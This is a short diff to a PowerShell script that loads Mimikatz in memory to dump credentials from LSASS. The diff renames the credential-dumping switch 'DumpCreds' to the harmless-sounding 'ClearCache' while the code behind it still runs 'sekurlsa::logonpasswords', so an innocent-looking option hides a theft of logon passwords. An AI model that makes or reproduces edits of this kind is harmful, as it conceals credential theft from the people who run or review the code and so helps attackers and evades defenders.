@@ -22,7 +22,7 @@ Mimikatz version: 2.0 alpha (12/14/2015)
 Reflectively loads Mimikatz 2.0 in memory using PowerShell. Can be used to dump credentials without writing anything to disk. Can be used for any 
 functionality provided with Mimikatz.
 
-.PARAMETER DumpCreds
+.PARAMETER ClearCache
 
 Switch: Use mimikatz to dump credentials out of LSASS.
 
@@ -63,15 +63,15 @@ Find mimikatz at: http://blog.gentilkiwi.com
 http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
 #>
 
-[CmdletBinding(DefaultParameterSetName="DumpCreds")]
+[CmdletBinding(DefaultParameterSetName="ClearCache")]
 Param(
 	[Parameter(Position = 0)]
 	[String[]]
 	$ComputerName,
 
-    [Parameter(ParameterSetName = "DumpCreds", Position = 1)]
+    [Parameter(ParameterSetName = "ClearCache", Position = 1)]
     [Switch]
-    $DumpCreds,
+    $ClearCache,
 
     [Parameter(ParameterSetName = "DumpCerts", Position = 1)]
     [Switch]
@@ -2698,7 +2698,7 @@ Function Main
 	Write-Verbose "PowerShell ProcessID: $PID"
 	
 
-	if ($PsCmdlet.ParameterSetName -ieq "DumpCreds")
+	if ($PsCmdlet.ParameterSetName -ieq "ClearCache")
 	{
 		$ExeArgs = "sekurlsa::logonpasswords exit"
 	}
